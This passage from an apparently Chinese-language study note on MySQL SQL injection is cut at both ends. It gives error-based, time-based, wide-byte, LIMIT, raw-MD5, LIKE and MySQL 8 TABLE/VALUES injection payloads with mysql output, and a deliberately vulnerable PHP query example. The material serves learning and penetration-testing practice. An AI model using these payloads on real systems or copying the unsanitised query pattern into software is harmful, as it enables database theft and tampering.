email&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ok&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-3-insert、update和delete报错注入"><a href="#3-3-insert、update和delete报错注入" class="headerlink" title="3.3 insert、update和delete报错注入"></a>3.3 insert、update和delete报错注入</h4><p>我们常见的注入都是selec查询注入比较多，但是SQL注入在参数没有检查和过滤的时候就会把恶意的数据插入数据库，从而造成SQL注入。</p>
<p>所以说除了查询之外，所有和数据库进行交互的请求都有可能造成注入。如：插入数据，更改数据，删除数据等，所以现在根据网上的技巧汇总一下insert、update和delete的注入方法。</p>
<p><strong>一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现。</strong></p>
<h5 id="0x1使用updatexml-函数"><a href="#0x1使用updatexml-函数" class="headerlink" title="0x1使用updatexml()函数"></a>0x1使用updatexml()函数</h5><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or updatexml(1,concat(0x7e,(version())),0) or</span><br></pre></td></tr></table></figure>

<p>insert注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">使用逻辑运算符（and or xor &amp;&amp; ||）</span><br><span class="line">mysql&gt; insert into users values (3,&#x27;name&#x27; xor updatexml(2,concat(0x7e,(version())),0) xor &#x27;&#x27;,&#x27;pass&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br><span class="line">mysql&gt; insert into users values (5,&#x27;name&#x27; and updatexml(2,concat(0x7e,(version())),0) and &#x27;&#x27;,&#x27;pass&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用算数运算符（+ – * /）</span><br><span class="line">mysql&gt; insert into users values (3,&#x27;name&#x27;+updatexml(2,concat(0x7e,(version())),0) xor &#x27;&#x27;,&#x27;pass&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br><span class="line">mysql&gt; insert into users values (3,&#x27;name&#x27;*updatexml(2,concat(0x7e,(version())),0) xor &#x27;&#x27;,&#x27;pass&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用位运算符连接（| &amp;）</span><br><span class="line">mysql&gt; insert into users values (3,&#x27;name&#x27;&amp;updatexml(2,concat(0x7e,(version())),0) xor &#x27;&#x27;,&#x27;pass&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br><span class="line">mysql&gt; insert into users values (3,&#x27;name&#x27;|updatexml(2,concat(0x7e,(version())),0) xor &#x27;&#x27;,&#x27;pass&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br></pre></td></tr></table></figure>

<p>update注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users set username = &#x27;name&#x27; and updatexml(2,concat(0x7e,(version())),0) and &#x27;&#x27; where id = 5;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br></pre></td></tr></table></figure>

<p>delete注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from users where id = 5 or updatexml(2,concat(0x7e,(version())),0) or &#x27;&#x27;;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.40-log&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="0x1-2使用extractvalue-函数"><a href="#0x1-2使用extractvalue-函数" class="headerlink" title="0x1.2使用extractvalue()函数"></a>0x1.2使用extractvalue()函数</h5><p>语法：extractvalue(目标xml文档，xml路径)</p>
<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or extractvalue(1,concat(0x7e,database())) or</span><br></pre></td></tr></table></figure>

<p>insert注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into info(name,age) values(&#x27;wangwu&#x27;or extractvalue(1,concat(0x7e,version())) or&#x27;&#x27;,&#x27;22&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.21&#x27;</span><br></pre></td></tr></table></figure>

<p>update注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update info set name=&#x27;test&#x27; or extractvalue(1,concat(0x7e,version())) or&#x27;&#x27; where id =1;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.21&#x27;</span><br><span class="line">mysql&gt; update info set name=&#x27;test&#x27; where id =1 or extractvalue(1,concat(0x7e,version()));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.21&#x27;</span><br></pre></td></tr></table></figure>

<p>delete注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from info where id=1 or extractvalue(1,concat(0x7e,version()));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.21&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="0x3使用name-const-函数"><a href="#0x3使用name-const-函数" class="headerlink" title="0x3使用name_const()函数"></a>0x3使用name_const()函数</h5><p>name_const(name,value)<br>返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a) or</span><br></pre></td></tr></table></figure>

<p>insert注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into info(name,age) values(&#x27;wangwu&#x27; or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a) or&#x27;&#x27;,&#x27;22&#x27;);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.7.21&#x27;</span><br></pre></td></tr></table></figure>

<p>update注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update info set name=&#x27;test&#x27;or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a) or&#x27;&#x27; where id =1;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.7.21&#x27;</span><br><span class="line">mysql&gt; update info set name=&#x27;test&#x27; where id =1 or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.7.21&#x27;</span><br></pre></td></tr></table></figure>

<p>delete注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from info where id=1 or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.7.21&#x27;</span><br></pre></td></tr></table></figure>

<p>实战测试：</p>
<p>HongCMS后台在清除表格的时候存在sql注入，即delete注入</p>
<p>详情连接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/178316.html">https://www.freebuf.com/vuls/178316.html</a></p>
<p>使用updatexml payload</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/20181129094720958.png" alt="20181129094720958"></p>
<p>使用extractvalue payload</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/2018112909594722.png" alt="2018112909594722"></p>
<p>使用name_const payload</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/20181129100730219.png" alt="20181129100730219"></p>
<h4 id="3-4宽字节注入"><a href="#3-4宽字节注入" class="headerlink" title="3.4宽字节注入"></a>3.4宽字节注入</h4><p>详细可看：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1719">https://xz.aliyun.com/t/1719</a></p>
<p>在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運&#x27;</span><br></pre></td></tr></table></figure>

<p>注入姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%df&#x27;order by 1 %23</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id = @$_GET[&#x27;id&#x27;];</span><br><span class="line"></span><br><span class="line">//id没有做 整形转换</span><br><span class="line">if( !isset($id)|| empty($id) )&#123;</span><br><span class="line">    exit(&#x27;get.id 参数不能为空&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    //分别对应的是 地址，端口号，连接的数据库，编码</span><br><span class="line">    $dsn = &quot;mysql:host=127.0.0.1; port=3306; dbname=test; charset=utf8&quot;;</span><br><span class="line"></span><br><span class="line">    //帐号</span><br><span class="line">    $user = &#x27;root&#x27;;</span><br><span class="line"></span><br><span class="line">    //密码 </span><br><span class="line">    $psw =&#x27;root&#x27;; </span><br><span class="line"></span><br><span class="line">    //连接到 MySQL</span><br><span class="line">    $pdo = new PDO($dsn,$user,$psw);</span><br><span class="line"></span><br><span class="line">    //准备执行的sql语句  start</span><br><span class="line">    $sql = &#x27;select * from tdb_goods where goods_id =&#x27;.&quot;&#x27;&#123;$id&#125;&#x27;&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">    //准备执行的sql语句 end</span><br><span class="line">    </span><br><span class="line">    //进行查询数据库出问题则报具体错误</span><br><span class="line">    $res = $pdo-&gt;query($sql) or var_dump($pdo-&gt;errorInfo());</span><br><span class="line"> </span><br><span class="line">    $mon = $res-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    print_r( $mon );</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    print $e-&gt;getMessage();</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h4 id="3-5笛卡尔积注入"><a href="#3-5笛卡尔积注入" class="headerlink" title="3.5笛卡尔积注入"></a>3.5笛卡尔积注入</h4><p>笛卡尔积是指在数学中，两个集合X和Y的笛卡尓积（Cartesian product），又称直积，表示为X × Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对的其中一个成员。</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br></pre></td></tr></table></figure>

<p>你完全可以按照这个规律，从C后面加个逗号，写D，E等等等，想写多少就写多少，但是写的越多查询的速度就会越慢，如果在表或者列数量很少的情况下，可以写的多一点。</p>
<p>到浏览器实践一下，发现确实延迟了。</p>
<h4 id="3-6MySQL约束攻击"><a href="#3-6MySQL约束攻击" class="headerlink" title="3.6MySQL约束攻击"></a>3.6MySQL约束攻击</h4><p><strong>知识点：</strong></p>
<ol>
<li>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire     ”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;vampire    &#x27;  &lt;=====&gt;  SELECT * FROM users WHERE username=&#x27;vampire&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p>
</li>
<li><p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。</p>
</li>
</ol>
<h4 id="3-7-limit注入"><a href="#3-7-limit注入" class="headerlink" title="3.7 limit注入"></a>3.7 limit注入</h4><p>此方法适用于MySQL 5.x中，在limit语句后面的注入 </p>
<p>一般实际过程中使用 limit 时，大概有两种情况，一种使用<code>order by</code>，一种就是不使用 <code>order by</code>关键字</p>
<h5 id="0x1-不存在-order-by-关键字"><a href="#0x1-不存在-order-by-关键字" class="headerlink" title="0x1 不存在 order by 关键字"></a>0x1 不存在 order by 关键字</h5><p>执行语句</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users limit 0,1</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这种情况下的 <code>limit</code> 后面可以使用<code>union</code>进行联合查询注入<br> 执行语句</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users limit 0,1 union select account from users;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210612181348741.png" alt="image-20210612181348741"></p>
<h5 id="0x2-存在order-by关键字"><a href="#0x2-存在order-by关键字" class="headerlink" title="0x2 存在order by关键字"></a>0x2 存在order by关键字</h5><p>执行语句</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id desc limit 0,1;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>此时后面再次使用<code>union</code>将会报错</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id desc limit 0,1 union select username from users</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210612181741154.png" alt="image-20210612181741154"></p>
<p>limit 关键字后面还可跟<code>PROCEDURE</code>和 <code>INTO</code>两个关键字，但是 <code>INTO</code> 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难，因此这里以<code>PROCEDURE</code>为例进行注入</p>
<ul>
<li>使用 <code>PROCEDURE</code>函数进行注入<br>ANALYSE支持两个参数，首先尝试一下默认两个参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id desc limit 0,1 procedure analyse(1,1);</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210612181834709.png" alt="image-20210612181834709"></p>
<p>报错，尝试一下对其中一个参数进行注入，这里首先尝试报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210612223126749.png" alt="image-20210612223126749"></p>
<p>成功爆出 mysql 版本信息，证明如果存在报错回显的话，可以使用报错注入在<code>limit</code>后面进行注入<br> 不存在回显怎么办，延迟注入呀<br> 执行命令</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果 <code>select version();</code> 第一个为5，则多次执行sha(1)达到延迟效果<br> 这里使用 sleep 进行尝试，但均未成功，所以需要使用BENCHMARK进行替代</p>
<h4 id="3-7-MD5注入"><a href="#3-7-MD5注入" class="headerlink" title="3.7 MD5注入"></a>3.7 MD5注入</h4><p>当php中使用到 md5($str,true) 输出md5值时，二进制被HEXdecode后可能会包含例如’or 1#的字符，从而产生sql注入</p>
<p>先看php中的md5函数，它有两个参数string和raw。<br>第一个参数string是必需的，规定要计算的字符串。<br>第二个参数raw可选，规定十六进制或二进制输出格式：</p>
<p>TRUE - 原始 - 16 字符二进制格式<br>FALSE - 默认 - 32 字符十六进制数<br>注入姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=129581926211651571912466741651878684928  //T0Do#&#x27;or&#x27;8</span><br><span class="line">password=ffifdyop //&#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>

<p>测试题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE pass = &#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>思路比较明确，当md5后的hex转换成字符串后，如果包含 ‘or’ 这样的字符串，那整个sql变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> admin WHERE pass = <span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;6&lt;trash&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>很明显可以注入了。</p>
<p>难点就在如何寻找这样的字符串.</p>
<p>提供一个字符串：<code>ffifdyop</code></p>
<p>md5后，276f722736c95d99e921722cf9ed621c</p>
<p>再转成字符串： ‘or’6</p>
<h4 id="3-8-LIKE注入"><a href="#3-8-LIKE注入" class="headerlink" title="3.8 LIKE注入"></a>3.8 LIKE注入</h4><p>like匹配<br>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。<br>1.like ‘s%’判断第一个字符是否为s</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like &#x27;s%&#x27;,3 --+</span><br></pre></td></tr></table></figure>

<p>2.like ‘se%’判断前面两个字符串是否为se</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like &#x27;se%&#x27;,3 --+</span><br></pre></td></tr></table></figure>

<p>3.like ‘%sq%’ 判断是否包含se两个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like &#x27;%se%&#x27;,3 --+</span><br></pre></td></tr></table></figure>

<p>4.like ‘_____’判断是否为5个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like &#x27;_____&#x27;,3 --+</span><br></pre></td></tr></table></figure>

<p>5.like ‘s____’ 判断第一个字符是否为s</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like &#x27;s____&#x27;,3 --+</span><br></pre></td></tr></table></figure>



<h4 id="3-9-mysql8新特性注入"><a href="#3-9-mysql8新特性注入" class="headerlink" title="3.9 mysql8新特性注入"></a>3.9 mysql8新特性注入</h4><p>详情：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231627">https://www.anquanke.com/post/id/231627</a></p>
<h5 id="0x01-mysql8语法新特征"><a href="#0x01-mysql8语法新特征" class="headerlink" title="0x01 mysql8语法新特征"></a>0x01 mysql8语法新特征</h5><p>在MySQL 8.0.19之后，MySQL推出几种新语法</p>
<p>1.TABLE STATEMENT</p>
<p>作用：列出表中所有内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>

<p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。<br><strong>例子</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; TABLE users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">6 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>加上order by排序或LIMIT限制后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">table users order by password;</span><br><span class="line">table users limit 1;</span><br><span class="line">table users limit 0,1;</span><br><span class="line">table users limit 1,1;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210613170724973.png" alt="image-20210613170724973"></p>
<p><strong>与SELECT的区别</strong>：</p>
<blockquote>
<p>1.TABLE始终显示表的所有列<br>2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</p>
</blockquote>
<p>2.VALUES statement</p>
<p><strong>VALUES statement</strong><br><strong>作用</strong>：列出一行的值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span> row_constructor_list [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_designator] [LIMIT <span class="keyword">BY</span> number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line">    <span class="type">ROW</span>(value_list)[, <span class="type">ROW</span>(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line">    <span class="keyword">value</span>[, <span class="keyword">value</span>][, ...]</span><br><span class="line"></span><br><span class="line">column_designator: </span><br><span class="line">    column_index</span><br></pre></td></tr></table></figure>

<p>VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。<br>ROW()返回的是一个行数据，VALUES将<code>ROW()返回的行数据</code>加上<code>字段</code>整理为一个表，然后展示<br><strong>例子</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span>  <span class="keyword">VALUES</span> <span class="type">ROW</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> column_0 <span class="operator">|</span> column_1 <span class="operator">|</span> column_2 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">VALUES</span> <span class="type">ROW</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+--------------+</span></span><br><span class="line"><span class="operator">|</span> column_0 <span class="operator">|</span> column_1 <span class="operator">|</span> column_2     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+--------------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span> flag     <span class="operator">|</span> this_is_flag <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+--------------+</span></span><br></pre></td></tr></table></figure>





<h5 id="0x02-利用MySQL8新特性绕过select"><a href="#0x02-利用MySQL8新特性绕过select" class="headerlink" title="0x02 利用MySQL8新特性绕过select"></a>0x02 利用MySQL8新特性绕过select</h5><p>场景：select关键词被过滤，多语句无法使用</p>
<p>1.判断列数<br>由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过UNION语句联合起来，当列数不对时会报错，根据这点可以判断列数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE users union VALUES ROW(1,2,3);</span><br></pre></td></tr></table></figure>

<p>2.使用values判断回显位</p>
